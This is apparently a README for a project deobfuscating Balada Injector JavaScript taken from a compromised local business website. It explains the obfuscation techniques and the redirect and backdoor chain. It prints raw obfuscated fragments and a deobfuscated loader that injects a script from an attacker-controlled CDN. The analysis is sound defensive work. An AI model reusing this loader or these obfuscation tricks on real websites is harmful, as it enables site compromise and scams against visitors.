# Balada Injector Malware Deobfuscation

## Introduction

This project is an attempt to deobfuscate and better understand malware that I discovered on the website of a local business.
I immediately notified the business of the issue, but I continued to dig deeper to understand what the code was attempting to do.

This `README.md` traces my process to understand and figure out what the code is attempting to do.

**Do not run any code in this repo or host it on any websites without extreme precaution**. See the `SECURITY.md` for more information.

## The state of the problem

The malware on the website was very obvious. When you first navigated to the website on a mobile device,
the website would load for a second and then take you through a number of "redirects".
Eventually, the user would end up on a strange domain asking you to allow notifications or `Click Here` to resolve the viruses detected on your system.
One of the redirect pages had a prominent phrase in Cyrillic at the bottom, roughly translating to, "Checking the browser To gain access, click the “Allow” button.".
Ultimately, the script seemed like a simple injection attack aimed at scamming/infecting users.

Once I realized that the malware consisted of JavaScript that was visible on the client, I used Chrome DevTools to copy/paste each of the malware scripts, which were executed on the company's website before navigating to the attacker's website, for further analysis.

## Repository structure

* `/raw` contains the scripts unedited from their original location. Do not run or host these scripts on your machine!
* `/deobfuscation-intermediate` contains each script after running it through https://obf-io.deobfuscate.io/ and then https://deobfuscate.io/. I learned that this process was most effective over time as I worked to understand the code.
* `/final` presents finalized scripts, refactored to improve clarity and provide helpful comments. These scripts retain the logic of those in `/raw` but with much greater clarity of purpose.
* `/tests` contains unit tests that were an integral part of my process. If you can safely cover pieces of the script with unit tests, you can more confidently refactor and ensure that you actually understand the behavior.

## Deobfuscating the scripts

### Initial exploration

Looking at the first few lines of the first sequential script suggested that there was a lot of work to do to figure out what was going on:

```javascript
// raw/rest-greenfastline.js - line 1
function _0x2a03(_0xdeed3c, _0x4af341) {
    var _0xf9c21c = _0x5214();
    return _0x2a03 = function(_0x347241, _0x1e9d99) {
        _0x347241 = _0x347241 - (-0x3 * 0x2ca + 0xe9f + -0x59f);
        ...
...
```

Almost every expression in the script used hexadecimal values,
but I did notice that some of these hexadecimal values were numeric values, rather than function or variable names, based on arithmetical expressions (e.g. `-0x3 * 0x2ca + 0xe9f + -0x59f`).
I downloaded a plugin to convert these values to decimal numbers, but this process required me to convert each value one at a time for rather unrewarding results like `-0x3 * 0x2ca + 0xe9f + -0x59f => -2142 + 3743 - 1439 => 1162`.

Rather than continue this path of manual substitution, I looked for strings and references to JavaScript built-ins that would help me to simplify things further.
I was able to locate some references to certain object method operations like `charCodeAt`.
```javascript
// raw/rest-greenfastline.js - line 17
... _0x23ff23['charCodeAt']
```

Additionally, I saw some references to the `document` object, which was likely being used to load additional scripts or otherwise manipulate data on the page maliciously.
```javascript
// raw/rest-greenfastline.js - line 128
    case '1':
        var _0x4a86df = document;
        continue;
```

Based on these findings, I refactored as much of the script as I could, changing things like ` var _0x4a86df = document;` to `var documentRef = document;`.
However, most of the strings in the script were still incomprehensible.
I could not understand what `documentRef[_0x3933c5(-0x40, 'tnrv', -0x4f, -0x35, -0x33) + _0x24397a(-0x1cc, -0x1e8, -0x1d9, 'hsUu', -0x1bd) + _0x3933c5(-0x60, '&X#l', -0x58, -0x62, -0x52)]` was actually doing and replacing hexadecimal digits with decimal digits wasn't going to help.
At this point, I began searching online for potential tools to help deobfuscate JavaScript code.
I found [deobfuscate.io](https://deobfuscate.io/) and entered the code from `/raw/rest-greenfastline.js`.
When I hit `Deobfuscate`, the site recommended I go to [Obfuscator.io Deobfuscator](https://obf-io.deobfuscate.io/) because it detected that it was likely obfuscated with that software.

Incredibly, the Obfuscator.io Deobfuscator returned a completely intelligible script from 160 lines of encrypted gibberish:

```javascript
// deobfuscation-intermediate/rest-greenfastline.js
function _0x23ff23() {
    var _0x4c2ecf = document.createElement("script");
    _0x4c2ecf.src = "https://cdn.specialtaskevents.com/JZFYbC";
    _0x4c2ecf.type = "text/javascript";
    _0x4c2ecf.id = "rtsoft";
    var _0x101a61 = Boolean(document.querySelector('script[id="rtsoft"]'));
    if (_0x101a61 == false) {
        if (document.currentScript) {
            document.currentScript.parentNode.insertBefore(_0x4c2ecf, document.currentScript);
            document.currentScript.remove();
        } else {
            document.getElementsByTagName("head")[0].appendChild(_0x4c2ecf);
        }
    }
}
_0x23ff23();
```

By accident, I had discovered that the attackers were likely using the [javascript-obfuscator](https://github.com/javascript-obfuscator/javascript-obfuscator) library to obfuscate their malware.
However, running the next file (`raw/special-task-event.js`) through [deobfuscate.io](https://deobfuscate.io/) did not yield as clean of results.
In fact, I wasn't directed back to [Obfuscator.io Deobfuscator](https://obf-io.deobfuscate.io/) and the resulting document was still largely obfuscated.

At this point, I turned back to DevTools to try and determine what this second script (`raw/special-task-event.js`) was doing.
Using the debugger and stepping through the code that was still live on the company's website, I managed to determine that `document[_0x2d72(475, "5Y&!") + "e"]` was `document.cookie`
This finding was immensely helpful for me, because it provided a valid test case that I could use to verify code validity while I worked on further refactoring. 
I set up `Jest` and tried to verify `expect(_0x2d72(475, "5Y&!") + "e").toBe('cookie');`, but my test returned `"nÉì"` rather than `cooki` for the decrypted string.

After a couple of hours casting about in the dark, I tried deobfuscating the raw file again, beginning with the [Obfuscator.io Deobfuscator](https://obf-io.deobfuscate.io/).
This time, the result was much cleaner and I managed to solidify an effective process.

### Successful deobfuscation process

1. Run the raw file through [Obfuscator.io Deobfuscator](https://obf-io.deobfuscate.io/)
2. Run the result through [deobfuscate.io](https://deobfuscate.io/) for a bit of additional simplification
3. Comment out any self-executing code (e.g. [IIFEs (Immediately invoked function expressions)](https://developer.mozilla.org/en-US/docs/Glossary/IIFE) or `var` declarations that required calling functions from the script to ensure that if the script is run it will not actually execute any malicious logic.
4. Get any piece of information that we know about the script under test to provide some assurance of consistency during further refactoring
5. Refactor function and variable names to clarify intent. Currently, these deobfuscation tools cannot effectively rename nonsense names in an informative way
6. Simplify logic by inlining redundant variables and extracting methods to provide more clarity about what is happening within the script

### The purpose of the malware

Through following this process, I was able to finally sketch out the purpose of the code:
1. The first script, `rest-greenfastline.js`, loads the second script `special-task-event.js`.
2. The second script, `special-task-event.js`, checks your cookies to attempt to determine if you are logged into WordPress on the site.
3. `special-task-event.js` loads the third script. If you are logged into WordPress, it will also append `&a=1` to the script.
4. The third script `gate-getmygateway.js` sends you to a separate webpage if you are not logged in. However, if you are logged in, it removes itself completely so that you continue using the site unaware after providing a potential entrypoint for the attackers.

Based on [research from the Sucuri team](https://blog.sucuri.net/2024/01/thousands-of-sites-with-popup-builder-compromised-by-balada-injector.html#:~:text=However%2C%20if%20the,felody.php%20plugin.),
adding `&a=1` is an attempt to create a backdoor to install a malicious plugin that will be able to continue to inject malicious code into WordPress files and severly infect the website.

### Obfuscation techniques

These files displayed a number of interesting JavaScript obfuscation techniques (for a more scholarly treatment see [The power of obfuscation techniques in malicious JavaScript code: A measurement study (Xu et al, 2012)](https://www.cse.psu.edu/~sxz16/papers/malware.pdf)).

**Data obfuscation** by encoding numbers as the arithmetic combination of hexadecimal values and strings as split and encoded values.

**Logical obfuscation** by creating self-modifying functions that change their own signature as they run and by encapsulating functions in other functions without meaningfully changing their behavior.

*Self-modifying function*
```javascript
// raw/rest-greenfastline.js - line 152
function _0x5214() {
    var _0x1ce5fb = ['W7tdILv+WOi', 'W5hdGNPtWOC', ...];
    
    _0x5214 = function() {
        return _0x1ce5fb;
    }
    ;
    return _0x5214();
}
```

*Meaninglessly encapsulated function* in which some of the arguments are not even used
```javascript
// raw/rest-greenfastline.js
function _0x24397a(_0x3251c9, _0x1d0b3e, _0x3b4b5c, _0x1c2195, _0x89e9e2) {
    return _0x2a03(_0x3251c9 - -0x2b3, _0x1c2195);
}
```

**Encoding Obfuscation** by using a permutation-based RC4 (Rivest Cipher 4) decryption process along with additional decoding steps.
This approach can be best appreciated in `final/special-test-event.js`.
The strings to be decoded were stored in an array returned by a self-modifying function.
The script was kicked off by an IIFE (renamed `iifeToDetermineTheArrayOrderForDecryption`) that shifted the first encoded value in the array to the final position until the decoded values matched the number `863819`.
At this point the rest of the script would become intelligible.
This piece of the script was finally understood through the unit tests included at `tests/rc4-decryption.test.js`.

## Sources

Ultimately, this project is largely indebted to:
* Research by [Sucuri's team on what I believe to be the same malware campaign](https://blog.sucuri.net/2024/01/thousands-of-sites-with-popup-builder-compromised-by-balada-injector.html). They identify the Balada operators as the likely culprits.
* https://obf-io.deobfuscate.io/ and https://deobfuscate.io/ whose tools provided an effective shortcut, after manually working through the script for a couple of hours, to further clarify the scripts.
